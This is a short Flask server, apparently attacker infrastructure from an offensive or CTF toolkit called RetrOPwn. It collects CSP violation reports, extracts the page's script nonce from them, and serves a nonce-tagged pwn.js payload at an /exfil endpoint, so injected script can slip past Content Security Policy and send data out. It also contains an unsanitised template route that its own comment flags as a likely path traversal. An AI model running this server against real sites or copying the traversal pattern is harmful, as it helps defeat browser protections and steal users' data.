from flask import Flask, request, render_template, Response
from flask_cors import CORS
import json

from RetrOPwn.web.csp import CSP_Breaker

app = Flask(__name__)
CORS(app)

# Exfiltration Content Management Implementation
Central_Content = dict({})

@app.route("/report_csp", methods=["POST"])
def report_csp():
    data = json.loads(request.get_data())

    csp_breaker = CSP_Breaker()
    csp_breaker.extractReport(data)

    Central_Content["csp-nonce"] = csp_breaker.csp_rule["script-src"][0][7:-1]

    print(Central_Content["csp-nonce"])

    return "ok"

@app.route("/get_nonce")
def get_nonce():
    return Central_Content["csp-nonce"]

@app.route("/exfil")
def exfil():
    res = Response(render_template("./pwn.js", nonce=Central_Content["csp-nonce"]))
    res.content_type = "application/javascript"
    return res

@app.route("/static/<string:page>")
def serve_static_page(page):

    print(page)

    # Maybe Path Traversal LOL ?
    return render_template(f"./{page}")

if __name__ == "__main__":
    app.run("127.0.0.1", 9000)

